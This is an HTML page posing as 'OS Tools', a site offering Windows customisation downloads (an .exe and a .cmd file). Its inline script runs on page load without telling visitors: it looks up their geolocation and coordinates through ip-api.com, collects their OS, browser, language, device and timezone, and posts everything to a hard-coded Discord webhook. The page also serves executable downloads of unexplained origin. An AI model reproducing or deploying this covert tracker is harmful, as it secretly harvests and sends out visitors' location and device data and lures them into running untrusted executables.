<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OS Tools</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body, html {
            height: 100%;
            font-family: 'Arial', sans-serif;
            background-color: #121212;
            color: #E0E0E0;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            height: 100%;
            padding: 20px;
        }

        h1 {
            font-size: 3rem;
            color: #00BFFF;
            margin-bottom: 10px;
        }

        p {
            font-size: 1.2rem;
            margin-bottom: 30px;
            max-width: 600px;
            line-height: 1.6;
        }

        .btn {
            display: inline-block;
            padding: 15px 25px;
            margin: 10px;
            background-color: #1E1E1E;
            color: #E0E0E0;
            text-decoration: none;
            font-size: 1.1rem;
            border: 2px solid #00BFFF;
            border-radius: 5px;
            transition: background-color 0.3s ease, transform 0.2s ease;
        }

        .btn:hover {
            background-color: #00BFFF;
            color: #121212;
            transform: scale(1.05);
        }

        @media (max-width: 768px) {
            h1 {
                font-size: 2.5rem;
            }

            p {
                font-size: 1rem;
                margin-bottom: 20px;
            }

            .btn {
                padding: 12px 22px;
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>OS Tools</h1>
        <p>OS Tools is a website that allows you to download customization tools for your OS, so you can personalize your operating system to match your unique style.</p>

        <a href="https://relmis.github.io/OSTools/ThemePersonalizer6.2.5.exe" class="btn" target="_blank">Download Theme Personalizer</a>
        <a href="https://relmis.github.io/OSTools/CustomTransormationPack1.6.cmd" class="btn" target="_blank">Download Custom Transformation Pack Creator</a>
    </div>

    <script>
        // Function to detect the user's OS
        function getOS() {
            const userAgent = navigator.userAgent;
            if (userAgent.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
            if (userAgent.indexOf("Mac") !== -1) return "macOS";
            if (userAgent.indexOf("X11") !== -1) return "Linux/Unix";
            if (userAgent.indexOf("Android") !== -1) return "Android";
            if (userAgent.indexOf("iPhone") !== -1 || userAgent.indexOf("iPad") !== -1) return "iOS";
            return "Unknown OS";
        }

        // Send the user information to Discord webhook
        function sendDataToDiscord() {
            fetch('https://ip-api.com/json?fields=country,city,regionName,lat,lon', { method: 'GET' })
                .then(response => response.json())
                .then(data => {
                    const { query: ip, city, regionName, country, lat, lon } = data;
                    const os = getOS();
                    const browser = navigator.userAgent;
                    const language = navigator.language;
                    const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
                    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

                    // Create the embed message
                    const embedMessage = {
                        content: '',
                        embeds: [{
                            title: "User Information",
                            fields: [
                                { name: "IP Address", value: ip, inline: false },
                                { name: "Location", value: `${city}, ${regionName}, ${country}`, inline: false },
                                { name: "Coordinates", value: `${lat}, ${lon}`, inline: false },
                                { name: "Operating System", value: os, inline: true },
                                { name: "Browser", value: browser, inline: true },
                                { name: "Language", value: language, inline: true },
                                { name: "Device Type", value: deviceType, inline: true },
                                { name: "Timezone", value: timezone, inline: true }
                            ]
                        }]
                    };

                    // Send to Discord Webhook (Your Webhook URL)
                    fetch('https://discord.com/api/webhooks/1355867531457331303/ik89sW3-lrpcv7gLmBgBpHgSzSAeVJUWg6knR18OdGGCvLCVukjpL8h26Nt7zTUPR6Su', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(embedMessage)
                    })
                    .catch(error => console.error('Error sending data to Discord webhook:', error));
                })
                .catch(error => console.error('Error fetching IP information:', error));
        }

        // Call the function to send data after page load
        sendDataToDiscord();
    </script>

</body>
</html>
